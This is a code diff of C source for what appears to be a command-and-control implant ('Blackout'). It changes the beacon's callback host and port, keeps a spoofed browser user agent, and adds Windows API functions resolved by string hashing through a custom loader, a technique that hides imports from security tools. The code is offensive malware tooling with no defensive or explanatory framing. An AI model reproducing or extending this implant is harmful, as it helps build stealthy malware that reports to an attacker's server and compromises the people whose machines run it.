@@ -2,8 +2,8 @@
 #include <utils.h>
 #include <constexpr.h>
 
-#define CONFIG_HOST       L"172.25.31.176"
-#define CONFIG_PORT       803
+#define CONFIG_HOST       L"172.29.29.80"
+#define CONFIG_PORT       4433
 #define CONFIG_USERAGENT  L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
 #define CONFIG_SECURE     FALSE
 #define CONFIG_WRKHRS     NULL
@@ -81,7 +81,10 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.GetMappedFileNameA        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetMappedFileNameA" )  );
     Instance()->Win32.TerminateThread           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "TerminateThread" )  );
     Instance()->Win32.SetFileInformationByHandle= LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SetFileInformationByHandle" )  );
+    Instance()->Win32.LoadLibraryExA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExA" )  );
 
+    Instance()->Win32.RtlZeroMemory             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlZeroMemory" )  );
+    Instance()->Win32.RtlCopyMemory             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCopyMemory" )  );
     Instance()->Win32.RtlExitUserProcess        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserProcess" ) );
     Instance()->Win32.RtlExitUserThread         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlExitUserThread" ) );
     Instance()->Win32.RtlAllocateHeap           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlAllocateHeap" ) );
